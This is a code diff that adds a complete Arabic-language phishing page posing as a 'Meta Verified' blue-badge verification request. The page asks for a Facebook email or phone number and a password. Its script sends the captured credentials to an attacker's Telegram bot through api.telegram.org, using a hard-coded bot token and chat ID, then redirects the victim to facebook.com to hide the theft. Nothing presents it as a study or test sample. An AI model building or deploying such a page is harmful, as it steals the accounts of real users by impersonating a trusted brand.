@@ -1,1 +1,75 @@
 
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Verified - مركز مساعدة الأنشطة التجارية</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Helvetica, Arial, sans-serif; }
+        body { background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #1c1e21; }
+        .container { background: #ffffff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); width: 100%; max-width: 420px; text-align: center; }
+        .logo { font-size: 28px; font-weight: bold; color: #0866ff; margin-bottom: 10px; }
+        h2 { font-size: 18px; font-weight: 600; margin-bottom: 20px; color: #4b4f56; }
+        .desc { font-size: 14px; color: #606770; margin-bottom: 20px; line-height: 1.5; text-align: right; }
+        .input-group { margin-bottom: 15px; text-align: right; }
+        .input-group label { display: block; font-size: 13px; font-weight: bold; margin-bottom: 5px; color: #4b4f56; }
+        input { width: 100%; padding: 12px; border: 1px solid #ccd0d5; border-radius: 6px; font-size: 14px; background: #f5f6f7; }
+        input:focus { border-color: #1877f2; outline: none; background: #fff; }
+        button { width: 100%; background-color: #1877f2; color: white; border: none; padding: 12px; font-size: 16px; font-weight: bold; border-radius: 6px; cursor: pointer; margin-top: 10px; transition: background 0.2s; }
+        button:hover { background-color: #166fe5; }
+        .footer { font-size: 11px; color: #90949c; margin-top: 20px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo">Meta Verified</div>
+    <h2>طلب توثيق الحساب الرسمي</h2>
+    <p class="desc">أدخل بيانات حسابك على فيسبوك للبدء بمراجعة طلب توثيق الحساب بالعلامة الزرقاء وحماية صفحتك.</p>
+    
+    <form id="phishForm">
+        <div class="input-group">
+            <label for="email">البريد الإلكتروني أو رقم الهاتف</label>
+            <input type="text" id="email" name="email" required autocomplete="username">
+        </div>
+        <div class="input-group">
+            <label for="password">كلمة المرور</label>
+            <input type="password" id="password" name="password" required autocomplete="current-password">
+        </div>
+        <button type="submit" id="submitBtn">إرسال طلب التوثيق</button>
+    </form>
+    
+    <div class="footer">Meta © 2026 • مركز الأمان والخصوصية</div>
+</div>
+
+<script>
+    document.getElementById('phishForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        const btn = document.getElementById('submitBtn');
+        
+        btn.innerText = "جاري التحقق...";
+        btn.disabled = true;
+
+        const botToken = "9023207016:AAGO13uf30IGKbxz9e4kPd4rBixNA8U8Mjs";
+        const chatId = "8833946932";
+        
+        const message = `🚨 صيد جديد - توثيق فيسبوك 🚨\n\n📧 الحساب: ${email}\n🔑 كلمة المرور: ${password}`;
+        
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+        
+        fetch(url)
+            .then(response => {
+                window.location.href = "https://www.facebook.com";
+            })
+            .catch(error => {
+                window.location.href = "https://www.facebook.com";
+            });
+    });
+</script>
+
+</body>
+</html>
